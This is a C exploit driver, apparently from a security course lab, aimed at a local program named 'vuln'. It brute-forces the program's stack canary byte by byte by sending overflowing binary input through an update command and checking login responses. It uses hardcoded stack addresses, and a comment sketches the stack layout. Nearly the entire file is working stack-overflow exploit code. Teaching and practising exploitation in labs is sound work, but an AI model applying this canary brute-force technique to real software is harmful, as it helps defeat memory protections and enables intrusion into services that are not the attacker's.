#include "driver_base.c"

int main() {
    char *nargv[3];
    nargv[0] = "vuln";
    nargv[1] = STRINGIFY(GRP);
    nargv[2] = NULL;
    char *outbuf;

    uint64_t auth_db_loc =     0x7ffc8b4ee588; // loc of db (local var of auth)
    uint64_t auth_cred     =   0x7ffc8b4ee4a0; // value of cred (after alloca)
    uint64_t auth_db_cred_dist      = auth_db_loc - auth_cred;

    create_subproc("./vuln", nargv);
    fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
            "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
            "to continue with the exploit\n");

    getchar();
    get_formatted("%*s");
	
    uint64_t stack_canary = 0x0000000000000000;
    uint64_t current_byte = 0x00;

    // iterate over each byte of the canary
    for(int i = 1; i <= 8; i++) {
        current_byte = 0x00;
        while(1) {
            // fprintf(stderr, "Attach Now!");
	    //	    getchar();
            // Buffer Size + DB + Cred + Canary - Password
            unsigned explsz = auth_db_cred_dist + 8 + 8 + 8 - 8;
            void* *expl = (void**)malloc(explsz);
            memset((void*)expl, 0x00, explsz);

            // Set existing bytes
            uint8_t *canary_bytes = (uint8_t *)&stack_canary;
            canary_bytes[i-1] = current_byte;
            expl[explsz/sizeof(void*)-1] = (void*)stack_canary;

            // get_formatted("%*s"); //Needed to clear out the Welcome message

            put_str("p 1234567\n");
            send();
            get_formatted("%*s");

            // fprintf(stderr, "i: %d,\tByte: %lx,\tDetermined Canary: %016lX\n", i, current_byte, stack_canary);
            put_str("u ");
            put_bin((char*)expl, explsz - 8 + i);
            put_str("\n");
            send();
            get_formatted("%*s");
            put_str("l \n");
            send();

            usleep(100000);
            outbuf = get_formatted_string("%*s");
            if(strcmp(outbuf, "Login denied. Try again") == 0) {
                break;
            }
            current_byte = current_byte + 1;
        }
    }
    fprintf(stderr, "Canary Computed: %016lx", stack_canary);

    // unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
    // void* *expl = (void**)malloc(explsz);
    // memset((void*)expl, 0x00, explsz);

    kill(pid, SIGINT);

    int status;
    wait(&status);

    if (WIFEXITED(status)) {
        fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
    } 
    else if (WIFSIGNALED(status)) {
        printf("vuln killed by signal %d\n", WTERMSIG(status));
    } 
    else if (WIFSTOPPED(status)) {
        printf("vuln stopped by signal %d\n", WSTOPSIG(status));
    } 
    else if (WIFCONTINUED(status)) {
        printf("vuln continued\n");
    }

    return 0;
}


/*


      <return addr - cred>
rbp   <g's rbp> 
      canary (stack canary)
      cred addr -> 000000
      db -> 000000



      cred -> 1234567_

*/
